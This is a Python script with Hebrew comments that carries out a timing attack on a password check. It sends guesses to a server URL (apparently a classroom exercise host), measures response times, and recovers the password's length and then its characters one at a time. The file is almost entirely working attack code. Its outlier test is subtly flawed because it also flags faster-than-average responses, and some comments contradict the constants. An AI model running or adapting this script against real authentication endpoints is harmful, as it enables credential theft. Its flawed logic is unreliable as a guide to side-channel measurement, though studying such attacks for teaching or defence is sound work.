from functions_zvi import timeit, mean, standardDeviation

# הגדרות בסיסיות
SERVER_URL = 'https://zvish123.pythonanywhere.com/'
CHARACTERS = 'esYM0123456789'  # התווים האפשריים בסיסמה
MAX_PASSWORD_LENGTH = 6
MEASUREMENTS_PER_TRY = 5  # כמה פעמים נמדד כל ניסיון
DELTA = 0.1

def find_password_length():
    """
    שלב 1: מציאת אורך הסיסמה

    איך זה עובד?
    - נשלח סיסמאות באורכים שונים (1, 2, 3...)
    - נמדד כמה זמן לוקח לשרת לבדוק כל אורך
    - כשנמצא קפיצה בזמן התגובה - מצאנו את האורך הנכון!
    """
    print("מחפש את אורך הסיסמה...")

    previous_time = None

    for length in range(1, MAX_PASSWORD_LENGTH + 1):
        # יוצרים סיסמת ניסיון באורך מסוים (למשל: "___")
        test_password = "_" * length
        test_url = SERVER_URL + test_password

        # מודדים את זמן התגובה 10 פעמים ולוקחים את המינימום
        response_time = min(timeit(test_url, [], MEASUREMENTS_PER_TRY))
        print(f'בודק אורך {length}: זמן תגובה = {response_time:.4f} שניות')

        # אם יש קפיצה משמעותית בזמן - מצאנו את האורך!
        if previous_time and abs(response_time - previous_time) > DELTA :
            print(f"✓ אורך הסיסמה: {length - 1} תווים")
            return length - 1

        previous_time = response_time

    return MAX_PASSWORD_LENGTH


def find_password_characters(password_length):
    """
    שלב 2: מציאת התווים בסיסמה אחד אחרי השני

    איך זה עובד?
    - עבור כל מיקום בסיסמה (1, 2, 3...)
    - ננסה את כל התווים האפשריים (0-9)
    - התו שייקח הכי הרבה זמן לבדיקה = התו הנכון!
    """
    print(f"\nמחפש את תווי הסיסמה (אורך {password_length})...")

    found_password = ""

    # עובר על כל מיקום בסיסמה
    for position in range(1, password_length + 1):
        print(f"\n--- מחפש תו במיקום {position} ---")

        character_times = {}  # נשמור עבור כל תו את זמן התגובה

        # מנסה כל תו אפשרי
        for character in CHARACTERS:
            # בונה סיסמת ניסיון: מה שמצאנו + התו הנוכחי + מילוי
            test_password = found_password + character
            test_password = test_password.ljust(password_length, '_')

            # מודד זמן תגובה
            test_url = SERVER_URL + test_password
            measurements = []
            response_time = min(timeit(test_url, measurements, MEASUREMENTS_PER_TRY))

            character_times[character] = response_time
            print(f"  {character}: {response_time:.4f} שניות")

        # מוצא את התו עם זמן התגובה הגבוה ביותר
        correct_character = find_outlier(character_times)

        if correct_character:
            found_password += correct_character
            print(f"✓ מצאתי: {found_password}{'*' * (password_length - position)}")
        else:
            print("לא הצלחתי למצוא תו ברור - צריך לנסות שוב")
            return None

    return found_password


def find_outlier(measurements):
    """
    מוצא את התו שבולט בזמן התגובה שלו (outlier)

    פרמטרים:
        measurements: מילון {תו: זמן_תגובה}

    מחזיר:
        התו שזמן התגובה שלו הכי שונה מהממוצע
    """
    times = list(measurements.values())
    avg = mean(times)  # ממוצע
    std = standardDeviation(times)  # סטיית תקן

    print(f"\n  סטטיסטיקה: ממוצע={avg:.4f}, סטיית תקן={std:.4f}")

    # מחפש תו שהזמן שלו גבוה משמעותית מהממוצע
    threshold = avg + (1.5 * std)  # סף: ממוצע + 1.5 סטיות תקן


    outliers = []
    for character, time in measurements.items():
        if abs(time - threshold) > DELTA:
            outliers.append(character)
            print(f"  → {character} בולט! ({time:.4f} ")

    # אם יש בדיוק תו אחד שבולט - מצאנו אותו!
    if len(outliers) == 1:
        return outliers[0]
    elif len(outliers) == 0:
        print(" אף תו לא בולט מספיק")
    else:
        print(f" יותר מדי תווים בולטים: {outliers}")

    return None


# ============= הרצת התוכנית =============
if __name__ == "__main__":
    print("=" * 50)
    print("התחלת מתקפת Timing Attack")
    print("=" * 50)

    # שלב 1: מציאת אורך הסיסמה
    # password_length = find_password_length()
    password_length = 6

    # שלב 2: מציאת התווים
    password = find_password_characters(password_length)

    if password:
        print("\n" + "=" * 50)
        print(f"🎉 הסיסמה היא: {password}")
        print("=" * 50)
    else:
        print("\n לא הצלחתי למצוא את הסיסמה")